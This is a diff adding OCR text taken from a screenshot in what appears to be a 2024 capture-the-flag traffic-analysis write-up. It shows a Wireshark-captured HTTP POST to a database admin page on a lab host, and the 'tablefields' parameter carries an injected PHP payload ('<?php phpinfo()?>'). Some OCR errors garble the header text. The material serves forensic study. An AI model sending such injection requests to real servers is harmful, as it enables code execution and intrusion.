@@ -1,0 +1,23 @@
+# OCR: b544b05adb2cb6f765aaf29a4ffdf67c.webp
+# 来源: .\02-WriteUp\2024\b544b05adb2cb6f765aaf29a4ffdf67c.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:18
+
+MG Wireshark. 3882 HTTP i (tep.stream eq 3221) . BSF. pcapng,
+POST /dbadmin/test_db.php?action=table_create HTTP/1.1
+Host: 192.168. 75.131
+Content-Length: 71
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.75.131
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozille/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Geck
+Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/
+33q=0.7
+Referer: http: //192.168.75.131/dbadmin/test_db.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: pla3412=admin; pla3412_salt=bvtcklk13pk; PHPSE5SID-4r06rggjncujs6jagr8bst8p65
+Connection: close
+tablename=test&tablefields=%3C%3Fphp+phpinfo%28%29%3F%3E&createtable=GoHTTP/1.1 200 OK
+Date: Wed, 31 Jul 2024 14:31:44 GMT
